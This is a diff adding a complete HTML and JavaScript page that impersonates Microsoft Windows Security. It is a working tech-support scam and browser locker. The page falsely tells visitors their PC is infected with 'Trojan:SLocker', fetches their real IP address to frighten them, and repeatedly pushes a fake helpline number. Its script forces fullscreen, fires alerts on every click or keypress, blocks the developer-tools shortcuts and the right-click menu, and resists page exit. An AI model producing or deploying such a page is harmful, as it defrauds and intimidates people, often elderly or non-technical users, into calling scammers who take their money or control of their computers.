@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Support Assistance</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            user-select: none;
+            cursor: default;
+        }
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f4f4; /* Generic background */
+            overflow: hidden;
+        }
+
+        /* Fake Browser Background to simulate the Safari header shown in the image */
+        .fake-browser-bg {
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 120px;
+            background: #fff;
+            border-bottom: 1px solid #ddd;
+            display: flex;
+            flex-direction: column;
+            z-index: 0;
+        }
+
+        .fake-safari-top {
+            background: #f1f1f1;
+            height: 48px;
+            border-bottom: 1px solid #ccc;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .fake-url-bar {
+            background: #fff;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 4px 12px;
+            font-size: 13px;
+            color: #333;
+            width: 60%;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .fake-url-bar img {
+            width: 16px; height: 16px; margin-right: 8px;
+        }
+
+        .fake-page-header {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            padding: 0 40px;
+            background: #fafafa;
+        }
+
+        .fake-page-header span {
+            font-size: 14px;
+            color: #555;
+            margin-left: 10px;
+        }
+
+        /* Centered Overlay Container */
+        .overlay-container {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+        }
+
+        /* ----- Blue Box ----- */
+        .blue-box {
+            position: absolute;
+            width: 580px;
+            background: #0060d1; /* Windows Security Blue */
+            color: white;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            border: 1px solid #0050a4;
+            transform: translate(-30px, -40px); /* Offset behind */
+            z-index: 10;
+            padding-bottom: 10px;
+        }
+
+        .blue-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 12px;
+            background: #0050a4;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .header-close {
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+        }
+        .header-close:hover { background: #e81123; }
+
+        .blue-content {
+            padding: 24px 30px;
+            text-align: center;
+        }
+
+        .blue-content h3 {
+            margin: 0 0 16px 0;
+            font-size: 16px;
+        }
+
+        .blue-content p {
+            margin: 0;
+            font-size: 13px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        .blue-footer {
+            display: flex;
+            justify-content: flex-end;
+            padding: 10px 30px;
+            gap: 12px;
+        }
+
+        .blue-btn {
+            background: transparent;
+            border: 1px solid white;
+            color: white;
+            padding: 5px 25px;
+            font-size: 13px;
+            border-radius: 2px;
+        }
+
+        /* ----- White Box ----- */
+        .white-box {
+            position: absolute;
+            width: 560px;
+            background: white;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
+            border: 1px solid #ccc;
+            z-index: 20;
+            transform: translate(15px, 20px); /* Front, slightly right/down */
+            display: flex;
+            flex-direction: column;
+        }
+
+        .white-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 6px 16px;
+            background: white;
+            border-bottom: 1px solid #eee;
+            color: #333;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .white-header .left {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .white-header-close {
+            color: #666;
+            font-weight: bold;
+            font-size: 14px;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+        }
+        .white-header-close:hover { background: #e81123; color: white; }
+
+        .white-content {
+            padding: 24px 30px;
+            text-align: center;
+            color: #000;
+            font-size: 13px;
+        }
+
+        .red-warn {
+            color: #d82b0b;
+            font-weight: 700;
+            font-size: 15px;
+            margin: 0 0 15px 0;
+        }
+
+        .bold-lines {
+            font-weight: 700;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+
+        .graphic-center {
+            display: flex;
+            justify-content: center;
+            align-items: flex-end;
+            gap: 15px;
+            margin: 20px 0 25px 0;
+            position: relative;
+        }
+
+        /* 4-square Windows Logo Logo */
+        .win-logo-grid {
+            display: grid;
+            grid-template-columns: 24px 24px;
+            gap: 2px;
+            position: relative;
+        }
+        .win-logo-grid div { width: 24px; height: 24px; }
+        .win-red { background: #F25022; }
+        .win-green { background: #7FBA00; }
+        .win-blue { background: #00A4EF; }
+        .win-yellow { background: #FFB900; }
+
+        .green-shield {
+            position: absolute;
+            bottom: -8px; right: -8px;
+            width: 20px; height: 20px;
+            background: #27ae60;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            color: white; font-size: 12px; font-weight: bold;
+            border: 2px solid white;
+        }
+
+        .orange-dot { width: 20px; height: 20px; background: #e67e22; border-radius: 50%; margin-bottom: 5px; }
+        .blue-dot { width: 20px; height: 20px; background: #3498db; border-radius: 50%; margin-bottom: 5px; }
+
+        .risk-text {
+            font-weight: 700;
+            margin-bottom: 12px;
+            line-height: 1.5;
+            font-size: 13.5px;
+            padding: 0 10px;
+        }
+
+        .helpline-text {
+            color: #0060d1;
+            font-weight: 700;
+            font-size: 15px;
+            margin-bottom: 10px;
+        }
+
+        .white-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 24px;
+            background: #f9f9f9;
+            border-top: 1px solid #ddd;
+        }
+
+        .wf-left {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 700;
+            font-size: 14px;
+        }
+
+        .wf-left .mini-grid {
+            display: grid; grid-template-columns: 8px 8px; gap: 1px;
+        }
+        .wf-left .mini-grid div { width: 8px; height: 8px; }
+
+        .deny-btn {
+            background: #d82b0b;
+            color: white;
+            border: none;
+            padding: 7px 30px;
+            font-size: 14px;
+            border-radius: 2px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+
+        /* ----- Floating Support Box ----- */
+        .support-float {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: white;
+            border: 1px solid #ccc;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+            padding: 16px 20px;
+            width: 200px;
+            text-align: center;
+            border-radius: 4px;
+            z-index: 50;
+        }
+
+        .support-float .mini-grid {
+            display: grid; grid-template-columns: 12px 12px; gap: 2px;
+            justify-content: center;
+            margin-bottom: 8px;
+        }
+        .support-float .mini-grid div { width: 12px; height: 12px; }
+
+        .supp-title { font-weight: 700; font-size: 13px; margin-bottom: 8px; color: #333; }
+        .supp-phone { font-weight: 700; font-size: 16px; margin-bottom: 2px; color: #000; }
+        .supp-sub { font-size: 12px; color: #555; font-weight: 600; }
+
+    </style>
+</head>
+<body id="lock-body">
+
+    <div class="fake-browser-bg">
+        <div class="fake-safari-top">
+            <div class="fake-url-bar">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2" style="margin-right:8px;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                https://wadecatraining.org
+            </div>
+        </div>
+        <div class="fake-page-header">
+            <div class="win-logo-grid" style="grid-template-columns: 10px 10px; gap: 1px;">
+                <div class="win-red" style="width:10px;height:10px;"></div><div class="win-green" style="width:10px;height:10px;"></div>
+                <div class="win-blue" style="width:10px;height:10px;"></div><div class="win-yellow" style="width:10px;height:10px;"></div>
+            </div>
+            <span>Microsoft Help Support Assistance Err[USA00087]</span>
+        </div>
+    </div>
+
+    <!-- The actual scam modals -->
+    <div class="overlay-container">
+        
+        <!-- Background Blue Window -->
+        <div class="blue-box">
+            <div class="blue-header">
+                <div>
+                    <span style="display:inline-block; width:10px;height:10px; background:#fff; margin-right:6px;"></span>
+                    Microsoft Windows Security - Spyware Alert
+                </div>
+                <div class="header-close">✕</div>
+            </div>
+            <div class="blue-content">
+                <h3>** Microsoft Windows is infected with Trojan:SLocker **</h3>
+                <p>A critical error has occurred due to the outdated version of the browser.<br>Please contact support immediately to resolve this security vulnerability and prevent data loss over the network.</p>
+            </div>
+            <div class="blue-footer">
+                <button class="blue-btn lock-trigger">Cancel</button>
+                <button class="blue-btn lock-trigger">OK</button>
+            </div>
+        </div>
+
+        <!-- Foreground White Window -->
+        <div class="white-box">
+            <div class="white-header">
+                <div class="left">
+                    <div class="mini-grid" style="display:grid; grid-template-columns:6px 6px; gap:1px;">
+                        <div class="win-red" style="width:6px;height:6px;"></div><div class="win-green" style="width:6px;height:6px;"></div>
+                        <div class="win-blue" style="width:6px;height:6px;"></div><div class="win-yellow" style="width:6px;height:6px;"></div>
+                    </div>
+                    Microsoft Windows Security Center
+                </div>
+                <div class="white-header-close lock-trigger">✕</div>
+            </div>
+
+            <div class="white-content">
+                <p class="red-warn">Virus/Malware infections have been recognized on your device.</p>
+                <div class="bold-lines">
+                    Address IP: <span id="ip-addr">23.93.78.244</span> <span id="date-time">1/30/2024, 12:29:10 PM</span><br>
+                    Location: Berkeley, United States<br>
+                    ISP: Sonic Telecom LLC
+                </div>
+
+                <div class="graphic-center">
+                    <div class="win-logo-grid">
+                        <div class="win-red"></div><div class="win-green"></div>
+                        <div class="win-blue"></div><div class="win-yellow"></div>
+                        <div class="green-shield">✔</div>
+                    </div>
+                    <div class="orange-dot"></div>
+                    <div class="blue-dot"></div>
+                </div>
+
+                <p class="risk-text">Your personal data, banking information and web login credentials saved on this PC are at risk due to a major security breach.</p>
+                
+                <p class="helpline-text">Call Microsoft Windows Support: +1-877-592-0389 (Helpline)</p>
+            </div>
+
+            <div class="white-footer">
+                <div class="wf-left">
+                    <div class="mini-grid">
+                        <div class="win-red"></div><div class="win-green"></div>
+                        <div class="win-blue"></div><div class="win-yellow"></div>
+                    </div>
+                    Microsoft Windows
+                </div>
+                <button class="deny-btn lock-trigger">Deny</button>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Floating Support Box -->
+    <div class="support-float">
+        <div class="mini-grid">
+            <div class="win-red"></div><div class="win-green"></div>
+            <div class="win-blue"></div><div class="win-yellow"></div>
+        </div>
+        <div class="supp-title">Windows Support</div>
+        <div class="supp-phone">+1-877-592-0389</div>
+        <div class="supp-sub">(Head Office)</div>
+    </div>
+
+    <script>
+        // Fetch Real IP for scare tactics
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                document.getElementById('ip-addr').textContent = data.ip;
+            })
+            .catch(() => {});
+
+        // Set Real Date & Time
+        function updateDateTime() {
+            const now = new Date();
+            document.getElementById('date-time').textContent = now.toLocaleDateString() + ", " + now.toLocaleTimeString();
+        }
+        updateDateTime();
+        setInterval(updateDateTime, 1000);
+
+        // Attempt auto-fullscreen on load (may be blocked by modern browsers without a click)
+        window.onload = function() {
+            try { document.documentElement.requestFullscreen().catch(() => {}); } catch(e) {}
+        };
+
+        // Security Lock Mechanics
+        let locked = false;
+        const msg = "Microsoft Windows Security Alert!\n\nYour computer is infected with Trojan:SLocker.\nYour personal data and banking information are at risk.\n\nCall Support Immediately at +1-877-592-0389";
+
+        function enforceLock() {
+            if (!locked) {
+                // Request fullscreen
+                document.documentElement.requestFullscreen().catch(() => {});
+                locked = true;
+            }
+            // Annoying alert
+            alert(msg);
+        }
+
+        // Bind lock to all buttons and clicks on the body
+        document.querySelectorAll('.lock-trigger').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                e.stopPropagation();
+                enforceLock();
+            });
+        });
+
+        // Click or press any key to lock and fullscreen
+        document.body.addEventListener('click', enforceLock);
+        window.addEventListener('keydown', (e) => {
+            if (e.keyCode === 123 || (e.ctrlKey && e.keyCode === 85)) {
+                e.preventDefault();
+            }
+            enforceLock();
+        });
+
+        // Prevent leaving
+        window.onbeforeunload = function() {
+            return msg;
+        };
+
+        // Disable Context Menu
+        window.addEventListener('contextmenu', e => {
+            e.preventDefault();
+            enforceLock();
+        });
+    </script>
+</body>
+</html>
